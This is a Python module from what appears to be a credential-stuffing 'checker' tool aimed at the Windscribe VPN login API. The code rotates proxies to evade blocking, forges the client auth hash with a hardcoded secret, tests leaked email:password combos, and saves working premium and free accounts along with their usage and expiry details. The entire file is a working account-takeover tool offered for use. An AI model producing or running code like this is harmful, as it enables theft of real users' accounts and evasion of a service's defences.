from modules.variables import Checker
from requests import get,post
from modules.functions import bad_proxy, log,save,set_proxy
from time import time
from hashlib import md5

def check(email:str,password:str):
    username = email.split("@")[0] if "@" in email else email
    retries = 0
    while retries != Checker.retries:
        proxy = set_proxy()
        proxy_set = set_proxy(proxy)

        unix = time()
        auth_hash = md5(f"952b4412f002315aa50751032fcaab03{unix}".encode()).hexdigest()
        headers = {
            "Host": "api.windscribe.com" ,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0" ,
            "Accept": "*/*" ,
            "Accept-Language": "en-US,en;q=0.5" ,
            "Content-Type": "application/x-www-form-urlencoded" ,
            "Origin": "null" ,
            "Connection": "keep-alive" ,
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/x-www-form-urlencoded" 
        }
        data = f"username={username}&password={password}&time={unix}&client_auth_hash={auth_hash}&session_type_id=2"
        try:
            response = post("https://api.windscribe.com/Session?platform=firefox",headers=headers,data=data,proxies=proxy_set,timeout=Checker.timeout) 
            if response.status_code == 403 or "Could not log in with provided credentials" in response.text:
                retries += 1
            elif "session_auth_hash" in response.text:
                if "is_premium\": 0" in response.text:
                    if not Checker.cui:
                        log("custom",username+":"+password,"Windscribe")
                    save("Windscribe","custom",Checker.time,username+":"+password+f" | Original Combo: {email}:{password}")
                    Checker.custom += 1
                    Checker.cpm += 1
                    return
                elif "is_premium\": 1" in response.text:
                    djson = response.json()["data"]
                    email = djson["email"]
                    username = djson["username"]
                    used = f'{(((djson["traffic_used"]/1024)/1024)/1024)}GB/{(((djson["traffic_max"]/1024)/1024)/1024)}GB'
                    expire = djson["premium_expiry_date"]
                    if not Checker.cui:
                        log("good",username+":"+password,"Windscribe")
                    save("Windscribe","good",Checker.time,username+":"+password+f" | Email: {email} | Username: {username} | Used: {used} | Expire: {expire}")
                    Checker.good += 1
                    Checker.cpm += 1
                    return
            else:
                raise
        except:
            bad_proxy(proxy)
            Checker.errors += 1
    Checker.bad += 1
    Checker.cpm += 1
    return